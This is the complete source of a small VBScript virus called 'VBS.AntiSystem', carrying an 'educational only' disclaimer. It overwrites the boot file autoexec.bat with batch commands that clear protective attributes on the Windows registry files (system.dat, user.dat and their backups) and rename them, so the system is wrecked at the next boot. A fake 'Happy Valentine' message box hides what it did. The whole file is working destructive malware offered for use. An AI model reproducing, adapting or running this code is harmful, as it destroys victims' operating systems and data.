'VBS.AntiSystem by sevenC ~~~ ( Who else..?? )
'Purposed 4 educational onLy
'*********************************************
On Error Resume Next
Set WS = CreateObject("WScript.Shell")
Set FSO= Createobject("scripting.filesystemobject")
Set dropper = fso.CreateTextFile("C:\autoexec.bat")
dropper.writeline "@cd\windows"
dropper.writeline "@attrib -s -h -r *.dat"
dropper.writeline "@attrib -s -h -r *.da0"
dropper.writeline "@cd\"
dropper.writeline "@attrib -s -h -r *.1st"
dropper.writeline "@cd\WINDOWS"
dropper.writeline "@ren system.dat system.777"
dropper.writeline "@ren User.dat User.tea"
dropper.writeline "@ren system.da0 system.scv"
dropper.writeline "@cd\"
dropper.writeline "@ren system.st system.sex"
dropper.Close
msgbox "Wow...Greatz...Happy Valentine...!!",VBInformation,"VBS.AntiSystem"
